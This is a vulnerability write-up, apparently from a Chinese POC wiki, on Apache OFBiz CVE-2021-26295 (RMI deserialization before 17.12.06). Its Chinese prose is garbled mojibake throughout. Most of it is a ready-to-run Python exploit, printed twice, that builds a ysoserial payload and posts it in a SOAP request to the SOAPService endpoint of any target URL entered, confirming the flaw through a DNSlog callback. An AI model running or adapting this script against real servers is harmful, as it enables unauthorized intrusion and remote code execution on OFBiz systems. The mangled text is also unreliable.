> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XT2P6vB8e2pDp3_Dulfzhw)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

OFBiz æ˜¯åŸºäº Java çš„ Web æ¡†æ¶ï¼ŒåŒ…æ‹¬å®ä½“å¼•æ“ï¼ŒæœåŠ¡å¼•æ“å’ŒåŸºäºå°éƒ¨ä»¶çš„ UIã€‚

è¿‘æ—¥ï¼ŒApache OFBiz å®˜æ–¹å‘å¸ƒå®‰å…¨æ›´æ–°ã€‚Apache OFBiz å­˜åœ¨ RMI ååºåˆ—åŒ–å‰å°å‘½ä»¤æ‰§è¡Œï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ­¤æ¼æ´æ¥æˆåŠŸæ¥ç®¡ Apache OFBizï¼Œå»ºè®®ç›¸å…³ç”¨æˆ·å°½å¿«æµ‹è¯•æ¼æ´ä¿®å¤çš„ç‰ˆæœ¬å¹¶åŠæ—¶å‡çº§ã€‚

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

Apache OFBiz < 17.12.06

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

**Docker å®‰è£…ç¯å¢ƒ**

```
ä¸‹è½½åœ°å€Â http://peiqi.tech/shentou/CVE-2021-26295.zip
POCå‚è€ƒäº†ç½‘ä¸Šå…¬å¼€çš„å‡ ä½å¸ˆå‚…çš„è„šæœ¬
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4o8KooMCRwtxgX6n5FPjMYRYteCnicCiayEzdAWecDAS3Uznd17IVjCu4QRGCxfibCuckUhtD1OhhQQ/640?wx_fmt=png)

**ä½¿ç”¨ POC éªŒè¯ Dnslog å“åº”**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4o8KooMCRwtxgX6n5FPjMYkso7FSD2xAJetDAiblNicuibAQEnZQ82v5dQeVheibDKdib2WyKSbgiatUPQ/640?wx_fmt=png)

 ****å››:Â  æ¼æ´ POCğŸ¦‰****

```
import requests
import sys
import sys
import subprocess
import binascii
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34må…¬ä¼—å·  : PeiQiæ–‡åº“                                                   \033[0m')
    print('+  \033[34mVersion: Apache OFBiz                                            \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def trans(s):
    return "%s" % ''.join('%.2x' % x for x in s)

def POC_1(target_url, Dnslog):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS", Dnslog], stdout=subprocess.PIPE)
    data = popen.stdout.read()
    hex_data = trans(data)
    headers = {
        'Content-Type': 'text/xml'
    }
    post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><peiqi:clearAllEntityCaches xmlns:peiqi="http://ofbiz.apache.org/service/"><peiqi:cus-obj>%s</peiqi:cus-obj></peiqi:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % hex_data
    vuln_url = target_url + "/webtools/control/SOAPService"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/webtools/control/SOAPService..... \033[0m".format(target_url))
        if response.status_code == 200:
            print("\033[36m[o] è¯·æ£€æŸ¥ Dnslog å“åº”\n \033[0m")
        else:
            print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    Dnslog = str(input("\033[35mDnslog >>> \033[0m"))
    POC_1(target_url, Dnslog)
```

```
import requests
import sys
import sys
import subprocess
import binascii
from requests.packages.urllib3.exceptions import InsecureRequestWarning
def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34må…¬ä¼—å·  : PeiQiæ–‡åº“                                                   \033[0m')
    print('+  \033[34mVersion: Apache OFBiz                                            \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')
def trans(s):
    return "%s" % ''.join('%.2x' % x for x in s)
def POC_1(target_url, Dnslog):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS", Dnslog], stdout=subprocess.PIPE)
    data = popen.stdout.read()
    hex_data = trans(data)
    headers = {
        'Content-Type': 'text/xml'
    }
    post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><peiqi:clearAllEntityCaches xmlns:peiqi="http://ofbiz.apache.org/service/"><peiqi:cus-obj>%s</peiqi:cus-obj></peiqi:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % hex_data
    vuln_url = target_url + "/webtools/control/SOAPService"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/webtools/control/SOAPService..... \033[0m".format(target_url))
        if response.status_code == 200:
            print("\033[36m[o] è¯·æ£€æŸ¥ Dnslog å“åº”\n \033[0m")
        else:
            print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m")
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    Dnslog = str(input("\033[35mDnslog >>> \033[0m"))
    POC_1(target_url, Dnslog)
```

 ****äº”:Â  å…³äºæ–‡åº“ğŸ¦‰****

**åœ¨çº¿æ–‡åº“ï¼š**

**http://wiki.peiqi.tech**

**Githubï¼š**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“çš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨äº¤æµç¾¤å’Œå…¬ä¼—å·
> 
> æƒ³è¦åŠ å…¥äº¤æµç¾¤çš„å¸ˆå‚…å…¬ä¼—å·ç‚¹å‡»äº¤æµç¾¤åŠ æˆ‘æ‹‰ä½ å•¦~
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­

å…¬ä¼—å·

**æ–‡åº“æ¥æ”¶æ–‡åº“ä¸­æœªæ”¶å½•çš„æ¼æ´æŠ•ç¨¿å•¦ï¼Œä¸€èµ·å»ºè®¾æ–‡åº“å•¦~  
**